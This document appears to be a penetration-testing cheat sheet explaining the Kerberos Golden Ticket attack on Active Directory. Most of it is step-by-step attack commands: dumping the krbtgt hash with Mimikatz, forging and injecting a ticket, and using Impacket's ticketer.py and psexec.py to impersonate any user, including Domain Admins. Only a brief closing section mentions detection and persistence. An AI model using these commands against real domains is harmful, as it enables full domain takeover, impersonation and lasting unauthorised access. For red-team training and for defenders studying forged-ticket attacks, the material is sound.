A **Golden Ticket** attack allows an attacker to forge Kerberos **Ticket Granting Tickets (TGTs)** by using the **krbtgt account hash** of a domain.  
With this forged TGT, the attacker can impersonate **any user (including Domain Admins)** and obtain unrestricted access to domain resources.

---

## Requirements

- **krbtgt account hash** (NTLM/RC4 or AES key) and the **domain SID**.
- A tool to forge and inject Kerberos tickets (e.g., **Mimikatz**, **Impacket**).
- Access to a system inside the domain or a system that can use Kerberos authentication.

---

## Using Mimikatz (.kirbi ticket injection)

### Step 1: Dump the krbtgt Hash

On a compromised Domain Controller or system with domain admin privileges:
```bash
mimikatz.exe
lsadump::lsa /inject /name:krbtgt
```

- Extract the **RC4/NTLM hash** of the krbtgt account.
- Note the **Domain SID**.

### Step 2: Create the Golden Ticket
```bash
kerberos::golden /domain:<domain_name> /sid:<domain_SID> /rc4:<krbtgt_NTLM_hash> /user:<username> /ticket:golden.kirbi
```

- The `/user:` can be any user (e.g., `Administrator`), even if it does not exist.

### Step 3: Transfer and Inject the Ticket

- Transfer the generated `golden.kirbi` file to the attack machine.
- Inject the ticket:
```bash
mimikatz.exe
kerberos::ptt golden.kirbi
exit
```

### Step 4: Use the Forged Ticket

- With the ticket loaded in memory, access privileged resources:
```bash
dir \\<domain_controller>\c$
```
- You now have domain-wide access as the chosen user.



## Using Impacket (Linux/Kali)

### Step 1: Generate a Golden Ticket

On Kali or any Linux host with Impacket:
```bash
ticketer.py -nthash <krbtgt_NTLM_hash> -domain-sid <domain_SID> -domain <domain_name> <username>
```
- This creates a **Kerberos ticket cache (.ccache)** for the specified user.


### Step 2: Export the Ticket

Set the Kerberos ticket as the active credential:

```bash
export KRB5CCNAME=/path/to/Administrator.ccache
```

### Step 3: Use the Ticket

Leverage the Kerberos ticket to authenticate to services (no password required). For example:
```bash
psexec.py -n -k <domain>/<username>@<target_ip> cmd.exe
```
- `-k` tells Impacket to use the Kerberos ticket stored in the `KRB5CCNAME` environment variable.


---

## Key Considerations

- **Persistence:**  
    Golden Tickets remain valid until the krbtgt password is reset **twice**.
    
- **Detection:**  
    Monitoring for unusual TGT lifetimes, anomalous logins, or unexpected Kerberos activity can help detect forged tickets.
    
- **Privilege:**  
    Full domain compromise is usually required to obtain the krbtgt hash (e.g., from a Domain Controller).
